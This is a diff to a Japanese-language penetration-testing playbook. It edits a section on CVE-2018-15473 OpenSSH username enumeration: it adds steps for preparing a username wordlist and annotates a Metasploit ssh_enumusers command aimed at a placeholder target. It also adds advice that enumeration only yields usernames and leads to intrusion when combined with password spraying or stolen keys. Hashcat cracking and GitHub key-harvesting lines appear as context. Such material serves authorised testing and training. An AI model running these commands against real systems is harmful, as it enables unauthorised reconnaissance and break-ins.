@@ -294,10 +294,19 @@ hashcat -m 22921 key.hash /usr/share/wordlists/rockyou.txt
 
 ## 9. CVE-2018-15473 ユーザー列挙（OpenSSH 7.7 未満）
 
+**事前準備（必須）:** `USER_FILE` / PoC の `-u` は**実在するユーザー名辞書ファイルへのパス**を指す。`users.txt` はプレースホルダであり、ファイルが無いと `Msf::OptionValidateError: ... USER_FILE` で即失敗する（モジュールは走らない）。候補リストを先に用意する:
+
+```bash
+# [Attacker] 標準のユーザー名辞書を使う（seclists 等。ペネトレ用 Linux ディストリに同梱 or apt で導入）
+ls /usr/share/seclists/Usernames/                 # 例: top-usernames-shortlist.txt
+# [Attacker] 自前で作る場合（OSINT 候補を足す）
+printf '%s\n' root admin user test [OSINT_CANDIDATE] > users.txt
+```
+
 **コマンド:**
 
 ```bash
-# [Attacker] Metasploit モジュール
+# [Attacker] Metasploit モジュール（USER_FILE は上で用意した実在パスを指定）
 msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; \
   set RHOSTS [TARGET_IP]; set USER_FILE users.txt; run; exit"
 
@@ -319,6 +328,8 @@ curl https://github.com/[ORG_MEMBER_USERNAME].keys
 | 全ユーザーが invalid 判定 | OpenSSH 7.7+ にパッチ済み | LDAP / SMTP VRFY / SMB / OSINT で別経路から取得 |
 | ヒット数が乱高下する | ネットワーク遅延がタイミング差を上回る誤検知 | **1 ユーザー名で複数回測定して分散を見る** |
 | GitHub `.keys` で 200 + 鍵本文 | username 実在 + 公開鍵入手 | username 候補リストに追加 |
+
+**注意:** ユーザー列挙は**それ単体ではアクセスにならない**（有効 username が分かるだけ）。後段の §7 スプレー or 鍵/cred と組み合わせて初めて侵入になる。版数が該当しても得られるのは username のみなので、これに固執せず他サービス・他経路と並行する。
 
 > 原理: 公開鍵認証リクエストの特殊フィールドで、無効ユーザー名は即拒否、有効ユーザー名はパース時間がかかる差を利用。
 
